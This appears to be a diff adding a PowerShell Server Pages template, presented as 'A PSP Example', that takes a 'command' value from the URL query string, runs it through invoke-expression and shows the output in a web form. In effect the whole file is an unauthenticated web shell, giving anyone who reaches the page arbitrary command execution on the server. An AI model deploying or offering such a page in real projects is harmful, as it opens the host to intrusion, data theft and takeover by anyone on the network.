@@ -1,0 +1,24 @@
+<%
+	$queryString = [URI]::UnescapeDataString(($REQUEST.Url.Query -replace "\+"," "))
+	$myParams = ""
+	$myParam = ""
+	$myCmd = ""
+	$queryString -replace "\?", "" -split "&" | % {
+		$myParam = $_ -split "=" 
+		if ($myParam[0] -eq "command") {$myCmd = $myParam[1]}
+	}
+	$currentDir = pwd
+	try {$myResult = invoke-expression $myCmd | out-string} catch {}
+	if ($currentDir.path -ne (pwd).path) {CD $currentDir.path}
+	$lastCmd = $myCmd
+%>
+<html><body>
+	<a href="/">Home</a> |
+	<center><h2> Remote PowerShell Command Execution</h2></center>
+	<h3> - A PSP Example </h3>
+	<pre><p><div border=1><% $myResult %></div></p></pre>
+	<form method="GET" action="<%$localPath%>">
+		<b>Command Line&nbsp;</b><input type="text" maxlength=255 size=80 name="command" value="<% $lastCmd %>">
+		<input type="submit" name="button" value="Enter">
+	</form>
+</body></html>
